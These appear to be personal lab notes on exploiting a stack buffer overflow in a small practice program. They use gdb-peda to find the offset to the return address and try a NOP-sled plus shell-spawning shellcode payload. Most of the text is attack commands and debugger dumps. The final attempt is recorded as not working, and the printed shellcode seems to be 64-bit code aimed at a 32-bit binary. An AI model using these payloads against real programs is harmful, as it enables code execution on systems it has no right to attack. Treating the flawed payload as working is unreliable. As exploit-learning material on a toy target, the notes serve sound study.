Compile first
$> ./start
Disassemble
$> ./start disass
$> cat main.s
	lea	edx, -108[ebp]
	push	edx
	mov	ebx, eax
	call	strcpy@PLT
108 bytes are pushed onto edx, the strcpy second argument
Let's try
$> ./bof `perl -e 'print "A"x107'`
$> ./bof `perl -e 'print "A"x108'
zsh: segmentation fault (core dumped)  ./bof `perl -e 'print "A"x108'`
Let's inspect register in gdb
$> gdb bof
gdb-peda$ r `perl -e 'print "A"x108'`
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0x41414141 ('AAAA')
EDX: 0xffffd864 ("AAAA")
ESI: 0xf7f95e28 --> 0x1ced30
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0x4141413d ('=AAA')
EIP: 0x56555591 (<main+73>:	ret)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655558a <main+66>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x5655558d <main+69>:	leave
   0x5655558e <main+70>:	lea    esp,[ecx-0x4]
=> 0x56555591 <main+73>:	ret
   0x56555592 <__x86.get_pc_thunk.ax>:	mov    eax,DWORD PTR [esp]
   0x56555595 <__x86.get_pc_thunk.ax+3>:	ret
   0x56555596 <__x86.get_pc_thunk.ax+4>:	xchg   ax,ax
   0x56555598 <__x86.get_pc_thunk.ax+6>:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x4141413d
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x56555591 in main ()
gdb-peda$

Segfault occured at main()'s RET. Let's overwrite some more bytes
gdb-peda$ r `perl -e 'print "A"x112'`
gdb-peda$ i r ebp eip
ebp            0x41414141	0x41414141
eip            0x56555502	0x56555502 <__do_global_dtors_aux+66>
gdb-peda$ r `perl -e 'print "A"x116'`
gdb-peda$ i r ebp eip
ebp            0x41414141	0x41414141
eip            0x41414141	0x41414141

Good, we overwrited eip. Let's jump somewhere else
$> gdb bof
gdb-peda$ start
gdb-peda$ i addr buffer
Symbol "buffer" is at 0xf7dc7030 in a file compiled without debugging.
Ok, we located our buffer. We could do the same by inspecting the stack,
or check strcpy first parameter address :
$> gdb bof
gdb-peda$ r `perl -e 'print "A"x4 . "B"x108 . "C"x4'`
Stopped reason: SIGSEGV
0x43434343 in ?? ()
Now let's inspect the stack
gdb-peda$ x/200xw $esp
0xffffd870:	0xffffda00	0xffffd934	0xffffd940	0x5655555e
0xffffd880:	0xf7f963bc	0xffffd8a0	0x00000000	0xf7ddf793
0xffffd890:	0xf7f95e28	0xf7f95e28	0x00000000	0xf7ddf793
0xffffd8a0:	0x00000002	0xffffd934	0xffffd940	0xffffd8c4
0xffffd8b0:	0x00000002	0xffffd934	0xf7f95e28	0xf7fe67da
0xffffd8c0:	0xf7ffcfd4	0x00000000	0xf7f95e28	0x00000000
0xffffd8d0:	0x00000000	0x3e47e509	0x7a180f19	0x00000000
0xffffd8e0:	0x00000000	0x00000000	0x00000002	0x565553e0
0xffffd8f0:	0x00000000	0xf7fec2b0	0xf7fe6ca0	0x56557000
0xffffd900:	0x00000002	0x565553e0	0x00000000	0x56555411
0xffffd910:	0x56555548	0x00000002	0xffffd934	0x565555a0
0xffffd920:	0x56555600	0xf7fe6ca0	0xffffd92c	0xf7ffd900
0xffffd930:	0x00000002	0xffffdaa5	0xffffdad1	0x00000000
0xffffd940:	0xffffdb46	0xffffdb57	0xffffdb62	0xffffdb91
0xffffd950:	0xffffdbc0	0xffffdbd4	0xffffdbfd	0xffffdc08
0xffffd960:	0xffffdc1a	0xffffdc28	0xffffdc3f	0xffffdc6b
0xffffd970:	0xffffdc7f	0xffffdc99	0xffffdcb0	0xffffdce8
0xffffd980:	0xffffdd06	0xffffdd13	0xffffdd22	0xffffdd35
0xffffd990:	0xffffdd3d	0xffffdd4c	0xffffdd5d	0xffffdd93
0xffffd9a0:	0xffffddb2	0xffffddd8	0xffffdeea	0xffffdf18
0xffffd9b0:	0xffffdf2a	0xffffdf44	0xffffdf53	0xffffdf72
0xffffd9c0:	0xffffdf8b	0xffffdfa7	0xffffdfb8	0xffffdfc1
0xffffd9d0:	0x00000000	0x00000020	0xf7fd5db0	0x00000021
0xffffd9e0:	0xf7fd5000	0x00000010	0xbfebfbff	0x00000006
0xffffd9f0:	0x00001000	0x00000011	0x00000064	0x00000003
0xffffda00:	0x56555034	0x00000004	0x00000020	0x00000005
0xffffda10:	0x00000009	0x00000007	0xf7fd7000	0x00000008
0xffffda20:	0x00000000	0x00000009	0x565553e0	0x0000000b
0xffffda30:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xffffda40:	0x00000064	0x0000000e	0x00000064	0x00000017
0xffffda50:	0x00000000	0x00000019	0xffffda8b	0x0000001a
0xffffda60:	0x00000000	0x0000001f	0xffffdfcc	0x0000000f
0xffffda70:	0xffffda9b	0x00000000	0x00000000	0x00000000
0xffffda80:	0x00000000	0x00000000	0xcd000000	0x52731246
0xffffda90:	0x017b60fb	0x524de756	0x69c0deea	0x00363836
0xffffdaa0:	0x00000000	0x6f682f00	0x762f656d	0x686b6c61
0xffffdab0:	0x2f6d6965	0x672d7163	0x75687469	0x6f622f62
0xffffdac0:	0x78655f66	0x6c706d61	0x312f7365	0x666f622f
0xffffdad0:	0x41414100	0x42424241	0x42424242	0x42424242
0xffffdae0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdaf0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdb00:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdb10:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdb20:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdb30:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffdb40:	0x43434342	0x414c0043	0x663d474e	0x52465f72
0xffffdb50:	0x4654552e	0x4400382d	0x4c505349	0x3a3d5941
0xffffdb60:	0x4c4f0030	0x44575044	0x6f682f3d	0x762f656d
0xffffdb70:	0x686b6c61	0x2f6d6965	0x672d7163	0x75687469
0xffffdb80:	0x6f622f62	0x78655f66	0x6c706d61	0x312f7365
We can easily see our A, B and Cs
gdb-peda$ x/x  0xffffdad1
0xffffdad1:	0x41414141
Our buffer is located at 0xffffdad1 !
Lets craft ou payload with a shellcode and jump into it !
108+4 = 112
shellcode length : 27
112 - 27 = 85
shellcode + 85 nop + buffer addr
gdb-peda$ r `perl -e 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "A"x85 . "\xd0\xda\xff\xff"'
Stopped reason: SIGSEGV
0xffffdad0 in ?? ()

Well, let's inspect the stack

0xffffdaa0:	0x00000000	0x6d6f682f	0x61762f65	0x65686b6c
0xffffdab0:	0x632f6d69	0x69672d71	0x62756874	0x666f622f
0xffffdac0:	0x6178655f	0x656c706d	0x2f312f73	0x00666f62
0xffffdad0:	0xbb48c031	0x91969dd1	0xff978cd0	0x53dbf748
0xffffdae0:	0x52995f54	0xb05e5457	0x90050f3b	0x90909090
0xffffdaf0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb00:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb10:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb20:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb30:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb40:	0xffffdad0	0x4e414c00	0x72663d47	0x2e52465f
0xffffdb50:	0x2d465455	0x49440038	0x414c5053	0x303a3d59
0xffffdb60:	0x444c4f00	0x3d445750	0x6d6f682f	0x61762f65
0xffffdb70:	0x65686b6c	0x632f6d69	0x69672d71	0x62756874

gdb-peda$ x/x 0xffffdad0
0xffffdad0:	0xbb48c031

This points to our shellcode...

gdb-peda$ r `perl -e 'print "\x90"x40 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "\x90"x45 . "\xd0\xda\xff\xff"'

0xffffdac0:	0x6178655f	0x656c706d	0x2f312f73	0x00666f62
0xffffdad0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdae0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdaf0:	0x90909090	0x90909090	0xbb48c031	0x91969dd1
0xffffdb00:	0xff978cd0	0x53dbf748	0x52995f54	0xb05e5457
0xffffdb10:	0x90050f3b	0x90909090	0x90909090	0x90909090
0xffffdb20:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdb30:	0x90909090	0x90909090	0x90909090	0x90909090

Still doesn't work...
